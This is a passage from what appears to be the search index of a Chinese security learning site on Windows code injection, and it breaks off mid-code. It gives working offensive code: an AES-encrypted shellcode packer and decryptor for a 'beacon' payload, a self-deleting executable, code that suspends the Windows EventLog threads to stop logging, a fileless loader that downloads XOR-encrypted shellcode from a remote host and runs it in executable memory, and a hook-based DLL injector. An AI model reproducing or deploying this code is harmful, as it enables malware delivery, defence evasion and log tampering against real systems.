rounds. AddRoundKey(Nr, state, RoundKey); // There will be Nr rounds. // The first Nr-1 rounds are identical. // These Nr rounds are executed in the loop below. // Last one without InvMixColumn() for (round = (Nr - 1); ; --round) { InvShiftRows(state); InvSubBytes(state); AddRoundKey(round, state, RoundKey); if (round == 0) { break; } InvMixColumns(state); } } #endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1) /*****************************************************************************/ /* Public functions: */ /*****************************************************************************/ #if defined(ECB) && (ECB == 1) void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf) { // The next function call encrypts the PlainText with the Key using AES algorithm. Cipher((state_t*)buf, ctx->RoundKey); } void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf) { // The next function call decrypts the PlainText with the Key using AES algorithm. InvCipher((state_t*)buf, ctx->RoundKey); } #endif // #if defined(ECB) && (ECB == 1) #if defined(CBC) && (CBC == 1) static void XorWithIv(uint8_t* buf, const uint8_t* Iv) { uint8_t i; for (i = 0; i < AES_BLOCKLEN; ++i) // The block in AES is always 128bit no matter the key size { buf[i] ^= Iv[i]; } } void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length) { size_t i; uint8_t* Iv = ctx->Iv; for (i = 0; i < length; i += AES_BLOCKLEN) { XorWithIv(buf, Iv); Cipher((state_t*)buf, ctx->RoundKey); Iv = buf; buf += AES_BLOCKLEN; } /* store Iv in ctx for next call */ memcpy(ctx->Iv, Iv, AES_BLOCKLEN); } void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length) { size_t i; uint8_t storeNextIv[AES_BLOCKLEN]; for (i = 0; i < length; i += AES_BLOCKLEN) { memcpy(storeNextIv, buf, AES_BLOCKLEN); InvCipher((state_t*)buf, ctx->RoundKey); XorWithIv(buf, ctx->Iv); memcpy(ctx->Iv, storeNextIv, AES_BLOCKLEN); buf += AES_BLOCKLEN; } } #endif // #if defined(CBC) && (CBC == 1) #if defined(CTR) && (CTR == 1) /* Symmetrical operation: same function for encrypting as for decrypting. Note any IV/nonce should never be reused with the same key */ void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length) { uint8_t buffer[AES_BLOCKLEN]; size_t i; int bi; for (i = 0, bi = AES_BLOCKLEN; i < length; ++i, ++bi) { if (bi == AES_BLOCKLEN) /* we need to regen xor compliment in buffer */ { memcpy(buffer, ctx->Iv, AES_BLOCKLEN); Cipher((state_t*)buffer, ctx->RoundKey); /* Increment Iv and handle overflow */ for (bi = (AES_BLOCKLEN - 1); bi >= 0; --bi) { /* inc will overflow */ if (ctx->Iv[bi] == 255) { ctx->Iv[bi] = 0; continue; } ctx->Iv[bi] += 1; break; } bi = 0; } buf[i] = (buf[i] ^ buffer[bi]); } } #endif // #if defined(CTR) && (CTR == 1) helpers.c #define _CRT_SECURE_NO_WARNINGS #include \"helpers.h\" int AES_KEY_LENGTH = 32; void build_decoding_table() { decoding_table = (char*)malloc(256); if (decoding_table == NULL) { DEBUG(\"[x] Cannot allocate memory for the decoding table\\n\"); exit(-1); } for (int i = 0; i < 64; i++) { decoding_table[(unsigned char)encoding_table[i]] = i; } } unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length) { if (decoding_table == NULL) build_decoding_table(); if (input_length % 4 != 0) return NULL; *output_length = input_length / 4 * 3; if (data[input_length - 1] == '=') { (*output_length)--; } if (data[input_length - 2] == '=') (*output_length)--; unsigned char* decoded_data = (unsigned char*)malloc(*output_length); if (decoded_data == NULL) return NULL; for (int i = 0, j = 0; i < input_length;) { DWORD sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]]; DWORD sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]]; DWORD sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]]; DWORD sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]]; DWORD triple = (sextet_a << 3 * 6) + (sextet_b << 2 * 6) + (sextet_c << 1 * 6) + (sextet_d << 0 * 6); if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF; if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF; if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF; } return decoded_data; } BOOL aes_decrypt(const uint8_t* key, size_t szKey, unsigned char* encrypted, size_t szEncrypted, unsigned char* unencryptedData) { // First 16 bytes represent the IV. uint8_t* iv = (uint8_t*)calloc(16, sizeof(uint8_t)); if (!iv) { DEBUG(\"[x] AES decryption failed (couldn't allocate IV).\\n\"); return FALSE; } memcpy(iv, encrypted, 16 * sizeof(uint8_t)); size_t szEncryptedData = szEncrypted - 16; memcpy(unencryptedData, &encrypted[16], szEncryptedData * sizeof(unsigned char)); struct AES_ctx ctx; // If the provided key is not complete (length != 32 bytes), a bruteforce is attempted. // Iterates over the missing bytes using the provided partial key as input. if (AES_KEY_LENGTH == szKey) { AES_init_ctx_iv(&ctx, key, iv); AES_CBC_decrypt_buffer(&ctx, unencryptedData, szEncryptedData); free(iv); return TRUE; } else { DWORD missingKeyLength = AES_KEY_LENGTH - szKey; DEBUG(\"[-] Provided key is missing %i bytes\\n\", missingKeyLength); uint8_t* missingKey = (uint8_t*)calloc(missingKeyLength, sizeof(unsigned char)); uint8_t* fullKey = (uint8_t*)calloc(AES_KEY_LENGTH + 1, sizeof(unsigned char)); if (!missingKey || !fullKey) { DEBUG(\"[x] AES decryption failed (couldn't allocate key elements).\\n\"); return FALSE; } uint8_t index = 0; memcpy(fullKey, key, (AES_KEY_LENGTH - missingKeyLength) * sizeof(uint8_t)); while (TRUE) { while (missingKey[index] <= 254) { memcpy(&fullKey[AES_KEY_LENGTH - missingKeyLength], missingKey, missingKeyLength * sizeof(uint8_t)); AES_init_ctx_iv(&ctx, fullKey, iv); AES_CBC_decrypt_buffer(&ctx, unencryptedData, szEncryptedData); uint8_t padding = unencryptedData[szEncryptedData - 1]; // Validate the decryption by checking that the last 4 bytes are egal to 0. if (unencryptedData[szEncryptedData - padding - 4] == 0x0 && unencryptedData[szEncryptedData - padding - 3] == 0x0 && unencryptedData[szEncryptedData - padding - 2] == 0x0 && unencryptedData[szEncryptedData - padding - 1] == 0x0) { free(iv); free(missingKey); free(fullKey); return TRUE; } else { memcpy(unencryptedData, &encrypted[16], szEncryptedData * sizeof(unsigned char)); } missingKey[index] += 1; } for (uint8_t i = 0; i < missingKeyLength; i++) { if (missingKey[i] == 255) { missingKey[i] = 0; if (i < missingKeyLength - 1) { missingKey[i + 1] += 1; } else { DEBUG(\"[x] AES decryption failed could not find the key.\\n\"); return FALSE; } } } } } } unsigned char* xor_text(const char* buff) { size_t size = strlen(buff); size_t osize; unsigned char* result = base64_decode(buff, size, &osize); for (int i = 0; i < osize; i++) { result[i] = result[i] ^ 0xA7; } return result; } wchar_t* char2wc(const char* buff) { const size_t cSize = strlen(buff) + 1; wchar_t* wc = malloc(cSize * sizeof(wchar_t)); mbstowcs(wc, buff, cSize); return wc; } python\u6587\u4ef6\uff0c\u52a0\u5bc6\u751f\u6210shellcode\uff0c\u968f\u673a\u751f\u6210\u52a0\u5bc6key from base64 import b64encode from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad from Crypto import Random import os import sys import string import random #key = b\"HrKHQxhUNxWuQxYdVEOZhoYbRcHeFmHS\" key = ''.join(random.choice(string.ascii_letters) for i in range(32)) key = key.encode() if len(sys.argv) == 3: key = sys.argv[2].encode() try: file = open(sys.argv[1], 'rb') data = file.read() file.close() except IndexError: data = shellcode data += b'\\x00\\x00\\x00\\x00' iv = Random.new().read(AES.block_size) cipher = AES.new(key, AES.MODE_CBC, iv) enc = cipher.encrypt(pad(data, AES.block_size)) ciphertext = b64encode(iv + enc) file = open('../sc.h', 'w') i = 1 k = 0 file.write('#define _CRT_SECURE_NO_WARNINGS\\n#pragma once\\n#include <string.h>\\n\\n') for j in range(len(ciphertext)): elt = ciphertext[j] if(i%16 == 1): if(i//16 % 2 == 0): file.write('const char sc_' + format(i//16) + '[16] = {') else: file.write('char sc_' + format(i//16) + '[16] = {') k += 1 file.write('{}'.format(hex(elt))) if(i%16 == 0): file.write('};\\n') elif j != len(ciphertext) - 1: file.write(',') i += 1 if(i%16 != 1): file.write('};\\n') file.write('\\nchar sc[{}];\\n'.format(len(ciphertext))) file.write('int sc_length = {};\\n'.format(len(ciphertext))) file.write(\"void buildsc_0(){\\n\") l = 1 m = 1 for i in range(k): file.write('\\tmemcpy(&sc[{}], sc_{}, 16);\\n'.format(i*16, i)) if(l % 200 == 0): file.write(\"}\\nvoid buildsc_\" + format(m) + \"(){\\n\") m += 1 l += 1 file.write(\"}\\n\") file.write(\"void buildsc(){\\n\") for i in range(m): file.write(\"\\tbuildsc_{}();\\n\".format(i)) file.write(\"}\") file.write('\\nBYTE key[] = \"{}\";\\n'.format(key.decode())) file.close() main\u6587\u4ef6 #include \"helpers.h\" #include <TlHelp32.h> #include \"sc.h\" int main(void) { buildsc(); //\u8c03\u7528\u51fd\u6570\u7ec4\u5408shellcode\uff0cshellcode\u5b58\u50a8\u5230sc\u6570\u7ec4 //\u5bf9shellcode base64\u89e3\u7801 size_t szOutput = 0; DWORD size = 0; unsigned char* file_enc = NULL; BYTE* beaconContent = NULL; size_t beaconSize = NULL; file_enc = base64_decode(sc, sc_length, &szOutput); if (szOutput == 0) { DEBUG(\"[x] Base64 decode failed \\n\"); return -1; } for (int i = 0; i < sc_length; i++) { printf(\"0x%x,\", file_enc[i]); } printf(\"\\n\"); //AES\u89e3\u5bc6 beaconSize = szOutput - 16; beaconContent = (unsigned char*)calloc(beaconSize, sizeof(BYTE)); BOOL decryptStatus = aes_decrypt(key, (sizeof(key) / sizeof(key[0])) - 1, file_enc, beaconSize, beaconContent); if (!decryptStatus || beaconContent == NULL) { DEBUG(\"[x] AES decryption failed\\n\"); return -1; } //\u5b8c\u5168\u89e3\u5bc6\u540e\u7684\u6570\u636e\u5b58\u50a8\u5728beaconContent\u6570\u7ec4\u4e2d for (int i = 0; i < beaconSize; i++) { printf(\"0x%x,\", beaconContent[i]); } printf(\"\\n\"); }","title":"\u81ea\u5b9a\u4e49AES"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_7","text":"","title":"\u5176\u4ed6"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_8","text":"\u8fd9\u4e2a\u7a0b\u5e8f\u53ea\u4f1a\u81ea\u5220\u9664 #include <Windows.h> #include <strsafe.h> #define SELF_REMOVE_STRING TEXT(\"cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \\\"%s\\\"\") void DelMe() { TCHAR szModuleName[MAX_PATH]; TCHAR szCmd[2 * MAX_PATH]; STARTUPINFO si = {0}; PROCESS_INFORMATION pi = {0}; GetModuleFileName(NULL, szModuleName, MAX_PATH); StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName); CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); } void main() { DelMe(); }","title":"\u7a0b\u5e8f\u81ea\u5220\u9664\u529f\u80fd"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#windows","text":"\u4ecesvchost\u4e2d\u83b7\u53d6windows\u4e8b\u4ef6\u8fdb\u7a0b\uff0c\u5728\u8fdb\u7a0b\u4e2d\u679a\u4e3e\u7ebf\u7a0b\u5e76\u6302\u8d77\u3002 \u672c\u5730\u672a\u6d4b\u8bd5\u6210\u529f\uff0c\u53ef\u80fd\u8ddf\u6743\u9650\u95ee\u9898\u6709\u5173 #include <iostream> #include <Windows.h> #include <Psapi.h> #include <TlHelp32.h> #include <dbghelp.h> #include <winternl.h> #include <strsafe.h> #pragma comment(lib, \"DbgHelp\") using myNtQueryInformationThread = NTSTATUS(NTAPI*)( IN HANDLE ThreadHandle, IN THREADINFOCLASS ThreadInformationClass, OUT PVOID ThreadInformation, IN ULONG ThreadInformationLength, OUT PULONG ReturnLength ); int main() { HANDLE serviceProcessHandle; HANDLE snapshotHandle; HANDLE threadHandle; HMODULE modules[2048] = {}; SIZE_T modulesSize = sizeof(modules); DWORD modulesSizeNeeded = 0; DWORD moduleNameSize = 0; SIZE_T modulesCount = 0; WCHAR remoteModuleName[128] = {}; HMODULE serviceModule = NULL; MODULEINFO serviceModuleInfo = {}; DWORD_PTR threadStartAddress = 0; DWORD bytesNeeded = 0; myNtQueryInformationThread NtQueryInformationThread = (myNtQueryInformationThread)(GetProcAddress(GetModuleHandleA(\"ntdll\"), \"NtQueryInformationThread\")); THREADENTRY32 threadEntry; threadEntry.dwSize = sizeof(THREADENTRY32); SC_HANDLE sc = OpenSCManagerA(\".\", NULL, MAXIMUM_ALLOWED); SC_HANDLE service = OpenServiceA(sc, \"EventLog\", MAXIMUM_ALLOWED); SERVICE_STATUS_PROCESS serviceStatusProcess = {}; //# Get PID of svchost.exe that hosts EventLog service QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatusProcess, sizeof(serviceStatusProcess), &bytesNeeded); DWORD servicePID = serviceStatusProcess.dwProcessId; //# Open handle to the svchost.exe //serviceProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, servicePID); serviceProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, servicePID); _Post_equals_last_error_ DWORD GetLastError(); snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); //# Get a list of modules loaded by svchost.exe EnumProcessModules(serviceProcessHandle, modules, modulesSize, &modulesSizeNeeded); _Post_equals_last_error_ DWORD GetLastError(); modulesCount = modulesSizeNeeded / sizeof(HMODULE); for (size_t i = 0; i < modulesCount; i++) { serviceModule = modules[i]; //# Get loaded module's name GetModuleBaseName(serviceProcessHandle, serviceModule, remoteModuleName, sizeof(remoteModuleName)); if (wcscmp(remoteModuleName, L\"wevtsvc.dll\") == 0) { printf(\"Windows EventLog module %S at %p\\n\\n\", remoteModuleName, serviceModule); GetModuleInformation(serviceProcessHandle, serviceModule, &serviceModuleInfo, sizeof(MODULEINFO)); } } //# Enumerate threads Thread32First(snapshotHandle, &threadEntry); while (Thread32Next(snapshotHandle, &threadEntry)) { if (threadEntry.th32OwnerProcessID == servicePID) { threadHandle = OpenThread(MAXIMUM_ALLOWED, FALSE, threadEntry.th32ThreadID); NtQueryInformationThread(threadHandle, (THREADINFOCLASS)0x9, &threadStartAddress, sizeof(DWORD_PTR), NULL); //# Check if thread's start address is inside wevtsvc.dll memory range if (threadStartAddress >= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll && threadStartAddress <= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll + serviceModuleInfo.SizeOfImage) { printf(\"Suspending EventLog thread %d with start address %p\\n\", threadEntry.th32ThreadID, threadStartAddress); //# Suspend EventLog service thread SuspendThread(threadHandle); Sleep(2000); } } } return 0; }","title":"\u6302\u8d77Windows\u4e8b\u4ef6\u670d\u52a1"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#shellcodehttp","text":"\u4e00\u79cd\u65e0\u6587\u4ef6shellcode\u7684\u5b9e\u73b0\u65b9\u5f0f\u3002 \u4f7f\u7528winhttp\u5e93\u6765\u8fdc\u7a0b\u4e0b\u8f7dshellcode \u6539\u8fdb\u601d\u8def 1.\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0b\u8f7d\u52a0\u5bc6\u7684\u6570\u636e\uff0c\u8981\u4f7f\u7528\u65f6\u518d\u89e3\u5bc6\u3002\uff08\u9700\u8981\u51c6\u5907\u4e00\u5957\u52a0\u5bc6\u7a0b\u5e8f\uff09 2.\u5b9e\u73b0\u8c03\u8bd5\u548c\u6c99\u7bb1\u5224\u65ad\uff0c\u662f\u771f\u5b9e\u73af\u5883\u65f6\u518d\u4e0b\u8f7dshellcode 3.\u654f\u611f\u51fd\u6570\u7ed5\u6740\u8f6fhook #include <windows.h> #include <winhttp.h> #include <stdio.h> #include <Windows.h> #include <iostream> #include <vector> #pragma comment(lib,\"winhttp.lib\") #pragma warning(disable:4996) typedef struct Params { LPVOID pBaseAddress; } PARAMS; typedef VOID(*fprun)(PARAMS pParams); //XOR\u89e3\u5bc6\u7a0b\u5e8f void XOR(char* data, int len, unsigned char key) { int i; for (i = 0; i < len; i++) data[i] ^= key; } // Encryption Key const char key[2] = \"A\"; size_t keySize = sizeof(key); //\u52a0/\u89e3\u5bc6 void xor_bidirectional_encode(const char* key, const size_t keyLength, char* buffer, const size_t length) { for (size_t i = 0; i < length; ++i) { buffer[i] ^= key[i % keyLength]; } } //\u679a\u4e3e\u5806\u5e76XOR\u52a0\u5bc6 PROCESS_HEAP_ENTRY entry; void HeapEncryptDecrypt() { SecureZeroMemory(&entry, sizeof(entry)); while (HeapWalk(GetProcessHeap(), &entry)) { if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) { //\u5982\u679c\u5185\u5b58\u6570\u636e\u5b58\u5728 xor_bidirectional_encode(key, keySize, (char*)(entry.lpData), entry.cbData); // } } } //https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect int main() { //--------- CONFIGURE ----------- LPCWSTR remotehost = L\"192.168.14.1\"; //change to your IP int remoteport = 8000; //change to your port LPCWSTR remotedir = L\"/TEST1\"; //change to your directory of the hosted bin file unsigned char key = 0x7e; //change to your key //------------------------------- // Initialize variables HINTERNET hInternet; HINTERNET hHttpSession; HINTERNET hHttpConnection; HINTERNET hHttpRequest; DWORD dwSize; BOOL bResults; DWORD dwStatus; DWORD dwStatusSize; DWORD dwDownloaded = 0; LPSTR pszOutBuffer; std::vector<unsigned char> PEbuffer; // Initialize WinHTTP (change the first argument to a valid User-Agent instead) hInternet = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0); printf(\"[+] WinHTTP initialized\\n\"); // Connect to the HTTP server hHttpSession = WinHttpConnect(hInternet, remotehost, remoteport, 0); printf(\"[+] Connected to HTTP Server\\n\"); // Open an HTTP request hHttpRequest = WinHttpOpenRequest(hHttpSession, L\"GET\", remotedir, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0); printf(\"[+] Sending HTTP GET Request\\n\"); // Send a request bResults = WinHttpSendRequest(hHttpRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0); printf(\"[+] WinHTTP request sent\\n\"); // Wait for the response bResults = WinHttpReceiveResponse(hHttpRequest, NULL); printf(\"[+] Response retrieved\\n\"); do { dwSize = 0; if (!WinHttpQueryDataAvailable(hHttpRequest, &dwSize)) { printf(\"Error %u in WinHttpQueryDataAvailable.\\n\", GetLastError()); } // Allocate space for the buffer. pszOutBuffer = new char[dwSize + 1]; // No more available data if (!pszOutBuffer) { printf(\"[-] No more available data\"); dwSize = 0; } // Read the Data. ZeroMemory(pszOutBuffer, dwSize + 1); if (!WinHttpReadData(hHttpRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) printf(\"Error %u in WinHttpReadData.\\n\", GetLastError()); else PEbuffer.insert(PEbuffer.end(), pszOutBuffer, pszOutBuffer + dwDownloaded); } while (dwSize > 0); char* PE = (char*)malloc(PEbuffer.size()); for (int i = 0; i < PEbuffer.size(); i++) { PE[i] = PEbuffer[i] ^ key; //XOR encrypted printf(\"%x\",PE[i]); } //\u5230\u8fd9\u91cc\u5b8c\u6210\u4e0b\u8f7d\u653e\u5165\u5806\u5e76\u4ea6\u6216\u52a0\u5bc6 printf(\"[+] Encrypted shellcode allocated in heap\\n\"); // Set the base address of the current image. PARAMS pParams; pParams.pBaseAddress = (LPVOID)GetModuleHandleA(NULL); ////printf(\"[+] Current image base address = 0x%p\\n\", pParams.pBaseAddress); LPVOID pBuffer = VirtualAlloc(NULL, PEbuffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //\u5206\u914dRWX\u5185\u5b58\u5757 if (NULL == pBuffer) { printf(\"[!] VirtualAlloc failed\\n\"); exit(1); } //printf(\"[+] Allocated space for the buffer %p\\n\", pBuffer); XOR(PE, PEbuffer.size(), key); //decrypt the PE shellcode before writing to memory // Copy the shellcode into it. memcpy(pBuffer, PE, PEbuffer.size()); //printf(\"[+] Shellcode decrypted and written\\n\"); //((void(*)())pBuffer)(); //\u5230\u8fd9\u91cc\u5206\u914d\u5185\u5b58\uff0c\u628a\u89e3\u5bc6\u540e\u7684shellcode\u590d\u5236\u5230pBuffer //time for your creativity //printf(\"[+] Encrypting the heap for 10 seconds\\n\"); HeapEncryptDecrypt(); //////Sleep(10); //create your own sleep patch instead ////printf(\"[+] Decrypting the heap\\n\"); HeapEncryptDecrypt(); fprun Run = (fprun)pBuffer; Run(pParams); //\u8fd0\u884cHeapEncryptDecrypt\u662f\u5e72\u4ec0\u4e48\u7684\uff0c\u5bf9\u5f53\u524d\u5806\u52a0\u5bc6\u518d\u89e3\u5bc6\uff1f\u6709\u4ec0\u4e48\u7528 // Make a function pointer to the run function shellcode. //\u8fd9\u91cc\u662f\u6267\u884cshellcode // Close the HTTP request WinHttpCloseHandle(hHttpRequest); // Close the session WinHttpCloseHandle(hHttpSession); // Cleanup WinHttpCloseHandle(hInternet); free(PE); return 0; }","title":"\u65e0\u843d\u5730\u6587\u4ef6shellcode\uff08HTTP\u4e0b\u8f7d\uff09"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#peb","text":"PEB\u662fwindows\u4e2d\u7684\u8fdb\u7a0b\u73af\u5883\u5757\uff0c\u5b58\u50a8\u4e86\u8fdb\u7a0b\u76f8\u5173\u7684\u4fe1\u606f\u3002 \u5728windbg\u4e2d\u4f7f\u7528 dt _peb \u53ef\u4ee5\u67e5\u770b\u5f53\u524d\u8fdb\u7a0b\u7684peb\u7ed3\u6784\u4f53\uff0c\u5173\u952e\u7684\u4e09\u4e2a\u53c2\u6570 +0x010 ImageBaseAddress : Ptr64 Void +0x018 Ldr : Ptr64 _PEB_LDR_DATA +0x020 ProcessParameters : Ptr64 _RTL_USER_PROCESS_PARAMETERS \u627e\u5230peb\u5730\u5740 0:024> r $peb $peb=00000098d212b000 \u5c06\u5730\u5740\u5e94\u7528\u5230\u7ed3\u6784\u4f53\u4e2d\uff0c\u89c2\u5bdf ImageBaseAddress 0:024> dt _peb @$peb ntdll!_PEB +0x000 InheritedAddressSpace : 0 '' +0x001 ReadImageFileExecOptions : 0 '' +0x002 BeingDebugged : 0x1 '' +0x003 BitField : 0x34 '4' +0x003 ImageUsesLargePages : 0y0 +0x003 IsProtectedProcess : 0y0 +0x003 IsImageDynamicallyRelocated : 0y1 +0x003 SkipPatchingUser32Forwarders : 0y0 +0x003 IsPackagedProcess : 0y1 +0x003 IsAppContainer : 0y1 +0x003 IsProtectedProcessLight : 0y0 +0x003 IsLongPathAwareProcess : 0y0 +0x004 Padding0 : [4] \"\" +0x008 Mutant : 0xffffffff`ffffffff Void +0x010 ImageBaseAddress : 0x00007ff7`f8c90000 Void +0x018 Ldr : 0x00007ffb`bb5343c0 _PEB_LDR_DATA +0x020 ProcessParameters : 0x0000019a`f7605040 _RTL_USER_PROCESS_PARAMETERS \u67e5\u770b ImageBaseAddress \u7684\u5185\u5bb9 0:024> db 0x00007ff7f8c90000 00007ff7`f8c90000 4d 5a 00 00 00 00 00 00-00 00 00 00 00 00 00 00 MZ.............. 00007ff7`f8c90010 00 00 00 00 00 00 00 00-40 00 00 00 00 00 00 00 ........@....... 00007ff7`f8c90020 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00007ff7`f8c90030 00 00 00 00 00 00 00 00-00 00 00 00 40 00 00 00 ............@... 00007ff7`f8c90040 50 45 00 00 64 86 04 00-66 42 69 63 00 00 00 00 PE..d...fBic.... 00007ff7`f8c90050 00 00 00 00 f0 00 22 00-0b 02 0b 00 00 02 00 00 ......\"......... 00007ff7`f8c90060 3e 3f 00 00 00 00 00 00-00 70 00 00 00 70 00 00 >?.......p...p.. 00007ff7`f8c90070 00 00 c9 f8 f7 7f 00 00-00 10 00 00 00 02 00 00 ................ \u548c\u6587\u4ef6\u539f\u59cb\u5185\u5bb9\u662f\u76f8\u540c\u7684 \u76f4\u63a5\u67e5\u8be2 ImageBaseAddress 0:001> dt _peb ntdll!_PEB +0x010 ImageBaseAddress : Ptr64 Void 0:001> dd @$peb+0x010 L2 000007ff`fffd5010 49d40000 00000000 // 49d40000 00000000 is little-endian byte format - need to invert 0:001> db 0000000049d40000 L100 !peb","title":"PEB\u5b66\u4e60"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#setwineventhook","text":"SetWinEventHook\u662f\u4e00\u4e2a\u76d1\u63a7UI\u76f8\u5173\u64cd\u4f5c\u4e8b\u4ef6\u7684\u94a9\u5b50\uff0c\u53ef\u4ee5\u901a\u8fc7\u5b83\u6765\u4f7f\u7528callback\u6267\u884c\u60f3\u8981\u7684\u4ee3\u7801 https://scorpiosoftware.net/2023/09/24/windows-hook-events/ \u5355exe // SimpleWinEventHook.cpp : This file contains the 'main' function. Program execution begins and ends there. // #include \"pch.h\" #pragma comment(lib, \"oleacc\") const char* EventNameToString(DWORD event) { switch (event) { case EVENT_SYSTEM_SOUND: return \"Sound\"; case EVENT_SYSTEM_ALERT: return \"Alert\"; case EVENT_SYSTEM_FOREGROUND: return \"Foreground\"; case EVENT_SYSTEM_MENUSTART: return \"Menu Start\"; case EVENT_SYSTEM_MENUEND: return \"Menu End\"; case EVENT_SYSTEM_CAPTURESTART: return \"Capture Start\"; case EVENT_SYSTEM_CAPTUREEND: return \"Capture End\"; case EVENT_SYSTEM_MOVESIZESTART: return \"Move/Size Start\"; case EVENT_SYSTEM_MOVESIZEEND: return \"Move/Size End\"; case EVENT_SYSTEM_DIALOGSTART: return \"Dialog Start\"; case EVENT_SYSTEM_DIALOGEND: return \"Dialog End\"; case EVENT_SYSTEM_SWITCHSTART: return \"Switch Start\"; case EVENT_SYSTEM_SWITCHEND: return \"Switch End\"; case EVENT_SYSTEM_MINIMIZESTART: return \"Minimize Start\"; case EVENT_SYSTEM_MINIMIZEEND: return \"Minimize End\"; case EVENT_OBJECT_CREATE: return \"Object Create\"; case EVENT_OBJECT_DESTROY: return \"Object Destroy\"; case EVENT_OBJECT_SHOW: return \"Object Show\"; case EVENT_OBJECT_HIDE: return \"Object Hide\"; case EVENT_OBJECT_STATECHANGE: return \"State Changed\"; case EVENT_OBJECT_LOCATIONCHANGE: return \"Location Changed\"; case EVENT_OBJECT_NAMECHANGE: return \"Name Change\"; case EVENT_OBJECT_DESCRIPTIONCHANGE: return \"Desc Changed\"; case EVENT_OBJECT_VALUECHANGE: return \"Value Changed\"; case EVENT_OBJECT_PARENTCHANGE: return \"Parent Changed\"; } return \"\"; } void CALLBACK OnEvent(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD idEventThread, DWORD time) { CComPtr<IAccessible> spAcc; CComVariant child; ::AccessibleObjectFromEvent(hwnd, idObject, idChild, &spAcc, &child); CComBSTR name; if (spAcc) spAcc->get_accName(CComVariant(idChild), &name); DWORD pid = 16536; WCHAR exeName[MAX_PATH]; PCWSTR pExeName = L\"\"; if (hwnd && ::GetWindowThreadProcessId(hwnd, &pid)) { auto hProcess = ::OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid); if (hProcess) { DWORD size = _countof(exeName); if (::QueryFullProcessImageName(hProcess, 0, exeName, &size)) pExeName = wcsrchr(exeName, L'\\\\') + 1; ::CloseHandle(hProcess); } } printf(\"Event: 0x%X (%s) HWND: 0x%p, ID: 0x%X Child: 0x%X TID: %u PID: %u (%ws) Time: %u Name: %ws\\n\", event, EventNameToString(event), hwnd, idObject, idChild, idEventThread, pid, pExeName, time, name.m_str); } int main() { auto hHook = ::SetWinEventHook(EVENT_MIN, EVENT_MAX, nullptr, OnEvent, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS | WINEVENT_SKIPOWNTHREAD); ::GetMessage(nullptr, nullptr, 0, 0); } dll // WinHookInject.cpp : This file contains the 'main' function. Program execution begins and ends there. // #include \"pch.h\" int main(int argc, const char* argv[]) { DWORD pid = argc < 2 ? 0 : atoi(argv[1]); if (pid == 0) { printf(\"Warning: injecting to potentially processes with threads connected to the current desktop.\\n\"); printf(\"Continue? (y/n) \"); char ans[3]; gets_s(ans); if (tolower(ans[0]) != 'y') return 0; } auto hLib = ::LoadLibrary(L\"Injected.Dll\"); if (!hLib) { printf(\"DLL not found!\\n\"); return 1; } auto OnEvent = (WINEVENTPROC)::GetProcAddress(hLib, \"OnEvent\"); if (!OnEvent) { printf(\"Event handler not found!\\n\"); return 1; } auto hHook = ::SetWinEventHook(0x0016, 0x0017, hLib, OnEvent, pid, 0, WINEVENT_INCONTEXT); if (!hHook) { 